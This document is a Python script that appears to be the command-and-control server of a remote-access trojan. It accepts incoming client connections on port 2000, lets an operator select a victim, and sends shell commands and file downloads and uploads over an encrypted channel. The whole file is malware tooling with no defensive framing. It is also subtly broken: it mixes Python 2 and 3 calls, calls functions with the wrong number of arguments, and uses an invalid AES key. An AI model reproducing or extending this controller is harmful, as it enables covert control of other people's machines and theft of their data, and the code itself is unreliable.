#!/usr/bin/env python3

import os
import sys
import socket
from Crypto.Cipher import AES
from base64 import b64encode, b64decode

Encode = lambda c, x: b64encode(c.encrypt(x))
Decode = lambda c, x: c.decrypt(b64decode(x))

def pr(s):
  print(s + '\n')

# clear
if os.name == 'posix': s = 'clear' # linux
if os.name == 'nt':    s = 'cls'   # windows
clear = lambda: os.system(s)

# server socket
from socket import AF_INET, SOCK_STREAM
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()

# client sockets
socks = []
clients = []
active = False

# data: cmd/data
def Send(sock, data, end='EOFEOFEOFEOFEOFX'):
  sock.sendall(Encode(cipher, data + end))

def Receive(sock, end='EOFEOFEOFEOFEOFX'):
  data = ''

  d = sock.recv(1024)
  while(d):
    data += Decode(cipher, d)
    if data.endswith(end):
      break
    else:
      d = sock.recv(1024)

  return data[:-len(end)]

def download(sock, file):
    try:
        f = open(file, 'wb')
    except IOError:
        pr('Error opening file.')
        return

    Send(sock, 'download ' + file)

    pr('Downloading ' + file)

    d = Receive(sock)
    f.write(d)
    f.close()

def upload(sock, file):
    try:
        f = open(file, 'rb')
    except IOError:
        pr('Error opening file.')
        return

    Send(sock, 'upload ' + file)

    pr('Uploading ' + file)

    while True:
        d = f.read()
        if not d: 
            break
        Send(sock, d, '')

    f.close()

def refresh():
    clear()

    pr('Listening for clients...')

    l = len(clients)
    if l > 0:
        for i in range(0, l):
            j = i + 1
            pr('Client %d: %s' % (j, clients[i]))
    else:
        pr('...')

    pr('Press Ctrl+C to interact with client.\n')

while True:
  refresh()
  try:
    server.settimeout(10)

    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    activate = input('Enter option: ')

    if activate == 0:
      pr('Exiting...')

      for i in range(0, len(socks)):
        socks[i].close()

      sys.exit()

    activate -= 1
    
    clear()

    cipher = AES.new('xxx', AES.MODE_CFB, '0000000000000000')

    pr('Activating client %d: %s' % (activate, clients[activate]))

    active = True
    Send(socks[activate], 'Activate')

  while active:
    try:
      data = Receive(socks[activate])
    except:
      active = False

      pr('Client disconnected... ' + clients[activate])

      socks[activate].close()
      socks.remove(socks[activate])
      clients.remove(clients[activate])

      refresh()
     
      break

    if data == 'quitted':
      active = False

      pr('Exit.')

      socks[activate].close()
      socks.remove(socks[activate])
      clients.remove(clients[activate])

      refresh()
     
      break
    elif data != '':
      sys.stdout.write(data)
      nextcmd = raw_input()

      if nextcmd.startswith('download '):
        if len(nextcmd.split(' ')) > 2:
          download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
        else:
          download(socks[activate], nextcmd.split(' ')[1])

      elif nextcmd.startswith('upload '):
        if len(nextcmd.split(' ')) > 2:
          upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
        else:
          upload(socks[activate], nextcmd.split(' ')[1])

      elif nextcmd != '':
        Send(socks[activate], nextcmd)

      elif nextcmd == '':
        pr('Think before you type. ;)')
